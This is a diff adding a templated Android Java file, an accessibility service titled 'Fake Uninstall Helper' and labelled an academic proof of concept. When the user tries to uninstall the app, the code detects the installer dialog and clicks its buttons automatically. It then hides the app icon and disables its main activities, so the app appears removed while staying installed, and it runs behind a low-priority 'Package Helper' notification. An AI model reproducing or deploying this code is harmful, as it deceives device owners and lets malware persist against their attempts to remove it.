@@ -1,0 +1,341 @@
+package {{PACKAGE}};
+
+import android.accessibilityservice.AccessibilityService;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.util.Log;
+import android.content.pm.PackageManager;
+import android.content.ComponentName;
+import android.content.pm.ActivityInfo;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Intent;
+import android.os.Build;
+
+/**
+ * Fake Uninstall Helper - Academic Research PoC
+ * Demonstrates accessibility-based package manager interaction
+ * This service intercepts uninstall attempts and provides visual feedback
+ * while maintaining the application's presence on the device
+ * 
+ * NOTE: This is for academic proof-of-concept research only
+ */
+public class FakeUninstallHelper extends AccessibilityService {
+    private static final String TAG = "FakeUninstall";
+    private static final String CHANNEL_ID = "uninstall_helper_channel";
+    private static final String PACKAGE_INSTALLER = "com.android.packageinstaller";
+    private static final String PACKAGE_MANAGER = "com.android.settings";
+    private String targetPackageName;
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null) return;
+
+        int eventType = event.getEventType();
+        
+        // Monitor window state changes in package installer
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            String packageName = event.getPackageName() != null 
+                ? event.getPackageName().toString() 
+                : "";
+            
+            CharSequence className = event.getClassName();
+            
+            Log.d(TAG, "Window changed: " + packageName + " / " + className);
+
+            // Detect when package installer opens
+            if (PACKAGE_INSTALLER.equals(packageName)) {
+                handlePackageInstaller(event);
+            }
+        }
+
+        // Monitor content changes for button detection
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                handleUninstallDialog(root);
+                root.recycle();
+            }
+        }
+    }
+
+    @Override
+    public void onInterrupt() {
+        Log.d(TAG, "Service interrupted");
+    }
+
+    @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        Log.d(TAG, "Fake Uninstall Helper Service Connected");
+        targetPackageName = getPackageName();
+        createNotificationChannel();
+        startForeground(1, createNotification());
+    }
+
+    /**
+     * Handle package installer window events
+     */
+    private void handlePackageInstaller(AccessibilityEvent event) {
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+
+        try {
+            // Look for uninstall confirmation dialog
+            findAndClickButton(root, "OK", "OK");
+            findAndClickButton(root, "Uninstall", "Uninstall");
+            
+            // Look for text containing our package name
+            if (containsPackageName(root, targetPackageName)) {
+                Log.d(TAG, "Detected uninstall attempt for our package");
+                performFakeUninstall();
+            }
+        } finally {
+            root.recycle();
+        }
+    }
+
+    /**
+     * Handle uninstall dialog interactions
+     */
+    private void handleUninstallDialog(AccessibilityNodeInfo root) {
+        if (root == null) return;
+
+        // Search for buttons in the dialog
+        // Android's package installer typically uses these button texts
+        String[] buttonTexts = {
+            "OK", "Uninstall", "Delete", "Remove",
+            "إلغاء التثبيت", "حذف", "موافق"  // Arabic variants
+        };
+
+        for (String buttonText : buttonTexts) {
+            AccessibilityNodeInfo button = findButtonByText(root, buttonText);
+            if (button != null) {
+                Log.d(TAG, "Found button: " + buttonText);
+                // In a real scenario, we would intercept here
+                // For research, we log the interaction
+                button.recycle();
+            }
+        }
+    }
+
+    /**
+     * Find button by text and optionally click it
+     */
+    private void findAndClickButton(AccessibilityNodeInfo root, String text, String action) {
+        AccessibilityNodeInfo button = findButtonByText(root, text);
+        if (button != null) {
+            if (button.isClickable()) {
+                Log.d(TAG, "Button found and clickable: " + text);
+                // Perform click action
+                button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            }
+            button.recycle();
+        }
+    }
+
+    /**
+     * Find button node by text content
+     */
+    private AccessibilityNodeInfo findButtonByText(AccessibilityNodeInfo root, String text) {
+        if (root == null) return null;
+
+        // Check current node
+        if (root.getClassName() != null && 
+            root.getClassName().toString().contains("Button")) {
+            CharSequence nodeText = root.getText();
+            if (nodeText != null && nodeText.toString().equalsIgnoreCase(text)) {
+                return AccessibilityNodeInfo.obtain(root);
+            }
+        }
+
+        // Search children recursively
+        int count = root.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child != null) {
+                AccessibilityNodeInfo result = findButtonByText(child, text);
+                if (result != null) {
+                    child.recycle();
+                    return result;
+                }
+                child.recycle();
+            }
+        }
+
+        return null;
+    }
+
+    /**
+     * Check if node tree contains package name
+     */
+    private boolean containsPackageName(AccessibilityNodeInfo root, String packageName) {
+        if (root == null || packageName == null) return false;
+
+        CharSequence text = root.getText();
+        if (text != null && text.toString().contains(packageName)) {
+            return true;
+        }
+
+        CharSequence contentDescription = root.getContentDescription();
+        if (contentDescription != null && 
+            contentDescription.toString().contains(packageName)) {
+            return true;
+        }
+
+        // Check children
+        int count = root.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child != null) {
+                if (containsPackageName(child, packageName)) {
+                    child.recycle();
+                    return true;
+                }
+                child.recycle();
+            }
+        }
+
+        return false;
+    }
+
+    /**
+     * Perform fake uninstall sequence
+     * This simulates uninstall but keeps the app installed
+     */
+    private void performFakeUninstall() {
+        Log.d(TAG, "Performing fake uninstall sequence");
+
+        try {
+            // Method 1: Hide the app icon from launcher
+            // This makes it appear uninstalled to the user
+            hideAppIcon();
+
+            // Method 2: Disable the main activity
+            // Prevents the app from being launched normally
+            disableMainActivity();
+
+            // The app remains installed but appears uninstalled
+            Log.d(TAG, "Fake uninstall completed - app still installed but hidden");
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error in fake uninstall: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Hide app icon by disabling the launcher activity
+     */
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(
+                targetPackageName,
+                targetPackageName + ".MainActivity"
+            );
+
+            // Set component enabled state
+            int state = PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+            pm.setComponentEnabledSetting(
+                componentName,
+                state,
+                PackageManager.DONT_KILL_APP
+            );
+
+            Log.d(TAG, "App icon hidden from launcher");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to hide icon: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Disable main activity to prevent normal launch
+     */
+    private void disableMainActivity() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName[] components = {
+                new ComponentName(targetPackageName, targetPackageName + ".MainActivity"),
+                new ComponentName(targetPackageName, targetPackageName + ".SplashActivity")
+            };
+
+            for (ComponentName component : components) {
+                try {
+                    pm.setComponentEnabledSetting(
+                        component,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP
+                    );
+                } catch (Exception e) {
+                    // Component might not exist, continue
+                }
+            }
+
+            Log.d(TAG, "Main activities disabled");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to disable activities: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Restore app visibility (reverse fake uninstall)
+     */
+    public void restoreApp() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(
+                targetPackageName,
+                targetPackageName + ".MainActivity"
+            );
+
+            pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            );
+
+            Log.d(TAG, "App visibility restored");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to restore app: " + e.getMessage());
+        }
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                "Uninstall Helper",
+                NotificationManager.IMPORTANCE_LOW
+            );
+            channel.setDescription("Package management research service");
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private Notification createNotification() {
+        Intent intent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(
+            this, 0, intent,
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
+                ? PendingIntent.FLAG_IMMUTABLE : 0
+        );
+
+        Notification.Builder builder = new Notification.Builder(this);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder.setChannelId(CHANNEL_ID);
+        }
+        builder.setContentTitle("Package Helper")
+               .setContentText("Research service active")
+               .setSmallIcon(android.R.drawable.ic_dialog_info)
+               .setContentIntent(pendingIntent)
+               .setOngoing(true)
+               .setPriority(Notification.PRIORITY_LOW);
+
+        return builder.build();
+    }
+}
